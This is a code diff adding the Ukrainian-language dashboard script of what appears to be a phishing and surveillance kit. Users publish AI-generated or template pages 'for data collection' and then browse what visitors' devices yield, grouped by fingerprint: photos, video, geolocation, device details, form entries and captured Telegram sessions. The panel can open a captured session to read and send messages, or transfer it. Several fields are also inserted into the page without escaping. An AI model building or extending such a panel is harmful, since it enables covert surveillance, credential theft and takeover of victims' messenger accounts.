+                    window.location.href = `/?login_for=${window.location.pathname.split('/').pop()}`;
+                } else {
+                    throw new Error(data.message || data.error || 'Невідома помилка сервера');
+                }
+                return null;
+            }
+            return data;
+        }
+
+        async function loadUserData() {
+            dashboardContent.style.display = 'none';
+            settingsContent.style.display = 'none';
+            initialLoader.style.display = 'flex';
+            try {
+                const data = await apiCall('getUserData');
+                if (data) {
+                    userData = data;
+                    renderContent();
+                    populateTemplates();
+                }
+			} catch (e) {
+				try { localStorage.removeItem('jwt_token'); } catch (_) {}
+				showAlert('Ваш сеанс застарів. Будь ласка, увійдіть знову.', 'warning');
+				const userId = window.location.pathname.split('/').pop();
+				window.location.href = `/?login_for=${userId}`;
+            }
+            finally {
+                const currentHash = window.location.hash || '#dashboard';
+                const contentId = currentHash === '#settings' ? 'settings-content' : 'dashboard-content';
+                document.getElementById(contentId).style.display = 'block';
+                initialLoader.style.display = 'none';
+            }
+        }
+
+        function renderContent() {
+            const userId = window.location.pathname.split('/').pop();
+            const pageUrl = `${window.location.protocol}//${window.location.host}/page.html?id=${userId}`;
+
+            let pageHtml = `<div class="section-header"><div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" /></svg></div><div class="section-title"><h2>Ваша сторінка</h2><p>Керуйте публічною сторінкою для збору даних</p></div></div>`;
+            if (userData.publishedPage) {
+                pageHtml += `<div class="flex items-center justify-between mb-4 flex-wrap gap-4"><div class="status-badge published"><span class="dot"></span>Опубліковано</div><div class="flex gap-2"><button class="btn btn-secondary" onclick="openEditor()">Редагувати</button><button class="btn btn-danger" onclick="deletePage()">Видалити</button></div></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Публічне посилання</label><div class="input-group"><input type="text" class="input-field" value="${pageUrl}" readonly><button class="btn btn-secondary" onclick="this.previousElementSibling.select(); document.execCommand('copy');">Копіювати</button></div></div>`;
+            } else {
+                pageHtml += `<div class="flex items-center gap-4 mb-4"><div class="status-badge unpublished"><span class="dot"></span>Не опубліковано</div></div><p class="text-gray-600 mb-4">У вас ще немає створеної сторінки. Натисніть кнопку, щоб почати.</p><button class="btn btn-primary" onclick="openEditor()">Створити сторінку</button>`;
+            }
+            pageSection.innerHTML = pageHtml;
+            
+            dataSection.innerHTML = `<div class="section-header"><div class="section-icon" style="background-color: #f0e7ff; color: #8b5cf6;"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" /></svg></div><div class="section-title"><h2>Зібрані дані</h2><p>Переглядайте та керуйте всіма отриманими записами</p></div></div><div class="data-controls flex items-center justify-between flex-wrap gap-4"><div class="data-controls-spacer flex gap-2" style="width:151.42px"></div><button class="btn btn-primary" onclick="showClientData()">Переглянути дані</button></div>`;
+
+            const tg = userData.telegramBinding || {};
+            let tgButtonHtml = '', statusBadge = '';
+            if (tg.status === 'active') {
+                statusBadge = `<div class="status-badge published"><span class="dot"></span>Підключено</div>`;
+                tgButtonHtml = `<button class="btn btn-secondary" disabled>Підключено</button>`;
+            } else if (tg.status === 'pending') {
+                statusBadge = `<div class="status-badge pending"><span class="dot"></span>Очікує активації</div>`;
+                tgButtonHtml = `<button class="btn btn-primary" onclick="showExistingTelegramLink()">Показати посилання</button>`;
+            } else {
+                 statusBadge = `<div class="status-badge unpublished"><span class="dot"></span>Не підключено</div>`;
+                 tgButtonHtml = `<button class="btn btn-primary" onclick="generateTelegramLink(event)">Підключити</button>`;
+            }
+            telegramSection.innerHTML = `<div class="section-header"><div class="section-icon" style="background-color: #dbeafe; color: #2563eb;"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M6 12L3.269 3.126A59.768 59.768 0 0121.485 12 59.77 59.77 0 013.27 20.876L5.999 12zm0 0h7.5" /></svg></div><div class="section-title"><h2>Сповіщення Telegram</h2><p>Отримуйте миттєві сповіщення у вашому месенджері</p></div></div><div class="flex items-center justify-between flex-wrap gap-4">${statusBadge}${tgButtonHtml}</div>`;
+        }
+        
+        async function generateTelegramLink(event) {
+            const button = event.target;
+            button.disabled = true; button.textContent = 'Генерація...';
+            showLoader('Створення посилання для бота...');
+            try {
+                const data = await apiCall('generateBotLink');
+                if (data && data.activationId) {
+                    userData.telegramBinding.activationId = data.activationId;
+                    showExistingTelegramLink();
+                    userData.telegramBinding.status = 'pending';
+                    renderContent();
+                }
+            } catch(e) {
+                 showAlert('Не вдалося згенерувати посилання. Спробуйте пізніше.', 'error');
+                 button.disabled = false; button.textContent = 'Підключити';
+            } finally {
+                hideLoader();
+            }
+        }
+
+        function showExistingTelegramLink() {
+            const activationId = userData.telegramBinding?.activationId;
+            if (!activationId) {
+                showAlert('ID активації не знайдено. Спробуйте оновити сторінку.', 'error');
+                return;
+            }
+            const link = `https://t.me/view2ubot?start=${activationId}`;
+            telegramLinkInput.value = link;
+            telegramLinkButton.href = link;
+            openModal(telegramModal);
+        }
+
+        function populateTemplates() {
+            templatesList.innerHTML = userData.templates.map(t => 
+                `<button data-template-id="${t.templateId}" class="w-full text-left p-3 text-gray-700 hover:bg-gray-100 rounded-md">${t.name}</button>`
+            ).join('');
+
+            templatesList.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const templateId = btn.dataset.templateId;
+                    const template = userData.templates.find(t => t.templateId === templateId);
+                    if (template) {
+                        currentEditorState = { source: 'template', sourceTemplateId: templateId };
+                        setEditorContent(template.htmlContent, true);
+                    }
+                });
+            });
+        }
+
+        function confirmClearEditor() {
+            showConfirmModal('Ви впевнені, що хочете очистити редактор?', () => {
+                setEditorContent('', true);
+            });
+        }
+
+        function setEditorContent(content, pushToHistory = false) {
+            currentEditorState = { source: 'custom', sourceTemplateId: null };
+            editor.value = content;
+            if (pushToHistory) {
+                editorHistoryManager.clear();
+                editorHistoryManager.pushState(content);
+            }
+        }
+
+        function openEditor() {
+            let initialContent = '';
+            if (userData.publishedPage) {
+                const page = userData.publishedPage;
+                currentEditorState = { source: page.source, sourceTemplateId: page.sourceTemplateId };
+                if (page.htmlContent) {
+                    initialContent = page.htmlContent;
+                } else if (page.source === 'template') {
+                    const template = userData.templates.find(t => t.templateId === page.sourceTemplateId);
+                    initialContent = template ? template.htmlContent : '';
+                }
+            } else {
+                currentEditorState = { source: 'custom', sourceTemplateId: null };
+            }
+            editor.value = initialContent;
+            editorHistoryManager.clear();
+            editorHistoryManager.pushState(initialContent);
+            openModal(editorModal);
+        }
+
+        async function callAiService(payload) {
+            if (RENDER_AI_SERVICE_URL.includes('your-service-name')) {
+                throw new Error('Будь ласка, вкажіть вашу реальну адресу Render у константі RENDER_AI_SERVICE_URL.');
+            }
+            const response = await fetch(`${RENDER_AI_SERVICE_URL}/generate`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            });
+            if (!response.ok) {
+                const errorData = await response.json().catch(() => ({}));
+                throw new Error(errorData.error || `Сервер ШІ повернув помилку: ${response.status}`);
+            }
+            return response.json();
+        }
+
+        aiForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const prompt = aiPromptInput.value.trim();
+            const button = e.target.querySelector('button');
+            button.disabled = true;
+            aiMessage.textContent = 'ШІ думає (це може зайняти до хвилини)...';
+            showModalLoader(editorModalLoader, 'Генерація сторінки за допомогою ШІ...');
+
+            try {
+                const data = await callAiService({ mode: 'generate', userPrompt: prompt });
+                const htmlContent = data && data.html;
+                if (htmlContent && htmlContent.trim()) {
+                    setEditorContent(htmlContent, true);
+                    currentEditorState = { source: 'ai', sourceTemplateId: null };
+                    aiMessage.textContent = 'Готово!';
+                } else {
+                    throw new Error('Відповідь від ШІ порожня або некоректна.');
+                }
+            } catch (error) {
+                console.error('AI Generation Error:', error);
+                aiMessage.textContent = 'Помилка генерації: ' + error.message;
+            } finally {
+                setTimeout(() => aiMessage.textContent = '', 5000);
+                button.disabled = false;
+                hideModalLoader(editorModalLoader);
+            }
+        });
+
+        refineForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const prompt = refinePromptInput.value.trim();
+            const currentHtml = editor.value.trim();
+            if (!prompt) {
+                refineMessage.textContent = 'Введіть запит для вдосконалення.';
+                setTimeout(() => refineMessage.textContent = '', 3000);
+                return;
+            }
+            const button = e.target.querySelector('button');
+            button.disabled = true;
+            refineMessage.textContent = 'ШІ думає (це може зайняти до хвилини)...';
+            showModalLoader(editorModalLoader, 'Вдосконалення сторінки...');
+
+            try {
+                const data = await callAiService({ mode: 'refine', userPrompt: prompt, userCode: currentHtml });
+                const htmlContent = data && data.html;
+                if (htmlContent && htmlContent.trim()) {
+                    setEditorContent(htmlContent, true);
+                    currentEditorState = { source: 'ai', sourceTemplateId: null };
+                    refineMessage.textContent = 'Готово!';
+                } else {
+                    throw new Error('Відповідь від ШІ порожня або некоректна.');
+                }
+            } catch (error) {
+                console.error('AI Refine Error:', error);
+                refineMessage.textContent = 'Помилка генерації: ' + error.message;
+            } finally {
+                setTimeout(() => refineMessage.textContent = '', 5000);
+                button.disabled = false;
+                refinePromptInput.value = '';
+                hideModalLoader(editorModalLoader);
+            }
+        });
+
+        publishBtn.addEventListener('click', async () => {
+            const htmlContent = editor.value;
+            if (!htmlContent.trim()) {
+                showAlert('Неможливо опублікувати порожню сторінку.', 'warning');
+                return;
+            }
+            let payload = {
+                source: currentEditorState.source,
+                sourceTemplateId: currentEditorState.sourceTemplateId,
+                htmlContent: null
+            };
+            if (currentEditorState.source !== 'template') {
+                payload.htmlContent = htmlContent;
+            } else {
+                const template = userData.templates.find(t => t.templateId === currentEditorState.sourceTemplateId);
+                if (!template || template.htmlContent !== htmlContent) {
+                    payload.htmlContent = htmlContent;
+                }
+            }
+            showModalLoader(editorModalLoader, 'Публікація сторінки...');
+            try {
+                const updatedPage = await apiCall('publishPage', payload);
+                if (updatedPage) {
+                    userData.publishedPage = updatedPage;
+                    closeModal(editorModal);
+                    renderContent();
+                }
+            } catch(e) {
+                // apiCall handles alerts
+            } finally {
+                hideModalLoader(editorModalLoader);
+            }
+        });
+
+        function deletePage() {
+            showConfirmModal(
+                'Ви впевнені, що хочете видалити свою сторінку? Ця дія незворотня.',
+                async () => {
+                    showLoader('Видалення сторінки...');
+                    try {
+                        const result = await apiCall('deletePage');
+                        if (result) {
+                            userData.publishedPage = null;
+                            renderContent();
+                        }
+                    } catch(e) {
+                         // apiCall handles alerts
+                    } finally { hideLoader(); }
+                }
+            );
+        }
+        
+        async function refreshClientDataList() {
+            try {
+                const data = await apiCall('getCollectedData');
+                if (!data) return;
+                if (!clientsModal.open) return;
+
+                if (data.length === 0) {
+                    clientsDataContainer.innerHTML = '<p class="text-center text-gray-500 p-8">Ще немає зібраних даних.</p>';
+                    clientsModalFooter.style.display = 'none';
+                    return;
+                }
+                
+                clientsModalFooter.style.display = 'flex';
+                
+                const groupedByFingerprint = data.reduce((acc, item) => {
+                    (acc[item.fingerprint] = acc[item.fingerprint] || []).push(item);
+                    return acc;
+                }, {});
+
+                let html = `<div class="mb-4"><input type="checkbox" id="select-all-checkbox" onchange="toggleSelectAll(this.checked)"> <label for="select-all-checkbox" class="font-medium">Вибрати все</label></div>`;
+                for (const fingerprint in groupedByFingerprint) {
+                    html += `<div class="data-group mt-4"><div class="flex justify-between items-center mb-2 pb-2 border-b"><h3 class="font-semibold text-sm break-all">Пристрій: <code class="text-xs">${fingerprint}</code></h3><button class="btn btn-danger !p-2 !text-xs" onclick="handleDeleteAllForFingerprint('${fingerprint}')">Видалити всі дані</button></div>`;
+                    
+                    groupedByFingerprint[fingerprint].sort((a, b) => new Date(b.collectedAt) - new Date(a.collectedAt)).forEach(item => {
+                        let icon = '📄', description = `Невідомий тип: ${item.type}`;
+                        if (item.type === 'photos') { icon = '📸'; description = `${item.itemCount || 0} фото`; }
+                        else if (item.type === 'video') { icon = '📹'; description = `${item.itemCount || 0} відео`; }
+                        else if (item.type === 'location') { icon = '📍'; description = 'Геолокація'; }
+                        else if (item.type === 'form') { icon = '📝'; description = `Форма '${item.formId}'`; }
+                        else if (item.type === 'device_info') { icon = 'ℹ️'; description = 'Інформація про пристрій'; }
+                        else if (item.type === 'telegram_session') { icon = '💬'; description = 'Сесія Telegram'; }
+                        if (item.status === 'denied') description += ` (доступ заборонено)`;
+
+                        html += `<div class="mt-2 flex items-center gap-3"><input type="checkbox" class="data-entry-checkbox" value="${item.collectedAt}"><div class="p-2 rounded-md flex-grow flex justify-between items-center clickable-data-entry" onclick="viewDataEntryDetails('${item.collectedAt}')"><div class="flex items-center overflow-hidden"><span class="text-xl mr-3">${icon}</span><div class="overflow-hidden"><span class="font-medium truncate">${description}</span><p class="text-xs text-gray-500">${new Date(item.collectedAt).toLocaleString()}</p></div></div>${item.type === 'telegram_session' ? `<button class="btn btn-primary !p-2 !text-xs ml-4 flex-shrink-0" onclick="event.stopPropagation(); telegramManager.open('${item.collectedAt}')">Керувати</button>` : ''}</div></div>`;
+                    });
+                    html += `</div>`;
+                }
+                clientsDataContainer.innerHTML = html;
+            } catch (e) {
+                 clientsDataContainer.innerHTML = '<p class="text-center text-red-500 p-8">Не вдалося завантажити дані.</p>';
+            }
+        }
+
+        async function viewDataEntryDetails(timestamp) {
+            openModal(dataViewerModal);
+            dataViewerTitle.textContent = 'Перегляд даних';
+            dataViewerContent.innerHTML = '';
+            showModalLoader(dataViewerLoader);
+
+            try {
+                const dataEntry = await apiCall('getCollectedDataEntry', { timestamp });
+                if (!dataEntry) {
+                     dataViewerContent.innerHTML = '<p class="text-center text-red-500 p-8">Не вдалося завантажити деталі запису.</p>';
+                     return;
+                }
+
+                let contentHtml = `<p class="text-sm text-gray-500"><strong>Час:</strong> ${new Date(dataEntry.collectedAt).toLocaleString()}</p><p class="text-sm text-gray-500"><strong>Пристрій:</strong> <code>${dataEntry.fingerprint}</code></p><hr class="my-4">`;
+
+                if (dataEntry.type === 'photos') {
+                    dataViewerTitle.textContent = `Перегляд фото (${dataEntry.data.length} шт.)`;
+                    dataEntry.data.forEach(src => { contentHtml += `<img src="${src}" alt="Collected photo">`; });
+                } else if (dataEntry.type === 'video') {
+                    dataViewerTitle.textContent = `Перегляд відео (${dataEntry.data.length} шт.)`;
+                    dataEntry.data.forEach(src => { contentHtml += `<video src="${src}" controls></video>`; });
+                } else if (dataEntry.type === 'location') {
+                    dataViewerTitle.textContent = 'Перегляд геолокації';
+                    if (dataEntry.status === 'denied' || !dataEntry.data) {
+                        contentHtml += `<p class="text-red-600"><strong>Доступ заборонено:</strong> ${dataEntry.error || 'Дані відсутні.'}</p>`;
+                    } else {
+                        const { latitude, longitude } = dataEntry.data;
+                        contentHtml += `<div class="data-grid"><strong>Координати:</strong><span>${latitude}, ${longitude}</span><strong>Посилання:</strong><a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="text-blue-600 hover:underline">Відкрити на Google Maps</a></div>`;
+                    }
+                } else if (dataEntry.type === 'form') {
+                    dataViewerTitle.textContent = `Дані з форми '${dataEntry.formId}'`;
+                    contentHtml += '<h4>Поля форми:</h4><div class="data-grid">';
+                    for (const key in dataEntry.data) {
+                        contentHtml += `<strong>${key}:</strong> <span class="break-all">${dataEntry.data[key] || '<i>(пусто)</i>'}</span>`;
+                    }
+                    contentHtml += '</div>';
+                } else if (dataEntry.type === 'device_info') {
+                     dataViewerTitle.textContent = 'Інформація про пристрій';
+                    contentHtml += '<h4>Параметри:</h4><div class="data-grid">';
+                     for (const key in dataEntry.data) {
+                        contentHtml += `<strong>${key}:</strong> <span class="break-all">${dataEntry.data[key] || '<i>(N/A)</i>'}</span>`;
+                    }
+                    contentHtml += '</div>';
+                } else if (dataEntry.type === 'telegram_session') {
+                    dataViewerTitle.textContent = 'Сесія Telegram';
+                    contentHtml += `<div class="space-y-3"><p class="text-gray-700">Це збережена сесія доступу до Telegram.</p><div class="flex gap-2"><button class="btn btn-primary" onclick="telegramManager.promptTransferSession('${dataEntry.collectedAt}')">Передати</button></div><div id="transfer-inline-status" class="text-sm text-gray-500"></div></div>`;
+                 } else if (dataEntry.status === 'denied') {
+                    dataViewerTitle.textContent = `Помилка доступу (${dataEntry.type})`;
+                    contentHtml += `<p class="text-red-600">${dataEntry.error}</p>`;
+                } else {
+                    dataViewerTitle.textContent = `Невідомий тип даних: ${dataEntry.type}`;
+                    contentHtml += `<p>Не вдалося відобразити цей тип даних.</p><pre class="text-xs bg-gray-100 p-2 rounded-md">${JSON.stringify(dataEntry, null, 2)}</pre>`;
+                }
+                
+                dataViewerContent.innerHTML = contentHtml;
+            } catch (e) {
+                 dataViewerContent.innerHTML = '<p class="text-center text-red-500 p-8">Не вдалося завантажити деталі запису.</p>';
+            } finally {
+                hideModalLoader(dataViewerLoader);
+            }
+        }
+
+        async function showClientData() {
+            clientsDataContainer.innerHTML = `<div class="flex justify-center items-center p-8"><div class="animate-spin rounded-full h-8 w-8 border-t-2 border-blue-600 mr-3"></div><span>Завантаження списку...</span></div>`;
+            openModal(clientsModal);
+            try {
+                await refreshClientDataList();
+                if (dataPollingInterval) clearInterval(dataPollingInterval);
+                dataPollingInterval = setInterval(refreshClientDataList, 10000); 
+            } catch(e) { /* apiCall handles error display */ }
+        }
+
+        clientsModal.addEventListener('close', () => {
+            if (dataPollingInterval) {
+                clearInterval(dataPollingInterval);
+                dataPollingInterval = null;
+            }
+        });
+        
+        telegramClientModal.addEventListener('close', () => telegramManager.close());
+        document.getElementById('tg-back-btn').addEventListener('click', () => telegramManager.goBackToDialogs());
+        document.getElementById('tg-send-btn').addEventListener('click', () => telegramManager.sendMessage());
+        const tgMessageInput = document.getElementById('tg-message-input');
+        tgMessageInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); telegramManager.sendMessage(); }
+        });
+        tgMessageInput.addEventListener('input', () => {
+            tgMessageInput.style.height = 'auto';
+            tgMessageInput.style.height = (tgMessageInput.scrollHeight) + 'px';
+        });
+
+        document.getElementById('tg-file-btn').addEventListener('click', () => document.getElementById('tg-file-input').click());
+        document.getElementById('tg-file-input').addEventListener('change', (e) => telegramManager.handleFileSelect(e));
+
+        function toggleSelectAll(checked) {
+            document.querySelectorAll('.data-entry-checkbox').forEach(cb => cb.checked = checked);
+        }
+
+        function handleDeleteSelected() {
+            const selectedTimestamps = Array.from(document.querySelectorAll('.data-entry-checkbox:checked')).map(cb => cb.value);
+            if (selectedTimestamps.length === 0) {
+                showAlert('Будь ласка, виберіть записи для видалення.', 'warning');
+                return;
+            }
+            showConfirmModal(`Ви впевнені, що хочете видалити ${selectedTimestamps.length} запис(ів)?`, async () => {
+                showLoader('Видалення вибраних записів...');
+                try {
+                    await apiCall('deleteMultipleCollectedData', { timestamps: selectedTimestamps });
+                    await refreshClientDataList();
+                } catch(e) { /* apiCall handles error */ } 
+                finally { hideLoader(); }
+            });
+        }
+        
+        function handleDeleteAllForFingerprint(fingerprint) {
+            showConfirmModal(`Ви впевнені, що хочете видалити ВСІ дані для пристрою ${fingerprint.substring(0,10)}...? Ця дія незворотня.`, async () => {
+                showLoader('Видалення всіх даних пристрою...');
+                try {
+                    await apiCall('deleteAllDataForFingerprint', { fingerprint });
+                    await refreshClientDataList();
+                } catch(e) { /* apiCall handles error */ } 
+                finally { hideLoader(); }
+            });
+        }
+
+        function logout() {
+            const userId = window.location.pathname.split('/').pop();
+            localStorage.removeItem('jwt_token');
+            window.location.href = `/?login_for=${userId}`;
+        }
+
+        editor.addEventListener('keydown', function(e) {
+            if (e.key == 'Tab' && !e.ctrlKey && !e.metaKey) {
+                e.preventDefault();
+                var start = this.selectionStart, end = this.selectionEnd;
+                this.value = this.value.substring(0, start) + "\t" + this.value.substring(end);
+                this.selectionStart = this.selectionEnd = start + 1;
+            }
+        });
+        
+        burgerMenu.addEventListener('click', () => {
+            burgerMenu.classList.toggle('open');
+            sidebar.classList.toggle('open');
+            sidebarOverlay.classList.toggle('visible');
+        });
+        
+        function closeSidebar() {
+            burgerMenu.classList.remove('open');
+            sidebar.classList.remove('open');
+            sidebarOverlay.classList.remove('visible');
+        }
+
+        sidebarOverlay.addEventListener('click', closeSidebar);
+        
+        profileBtn.addEventListener('click', () => {
+            const userId = window.location.pathname.split('/').pop();
+            const pageUrl = `${window.location.protocol}//${window.location.host}/page.html?id=${userId}`;
+            document.getElementById('profile-nickname').value = userData.nickname || 'Невідомий користувач';
+            document.getElementById('profile-login-link').value = userData.personalLoginLink || '';
+            document.getElementById('profile-page-link').value = pageUrl;
+            openModal(profileModal);
+            closeSidebar();
+        });
+        aboutBtn.addEventListener('click', () => { 
+            openModal(aboutModal);
+            closeSidebar();
+        });
+    </script>
+</body>
+</html>
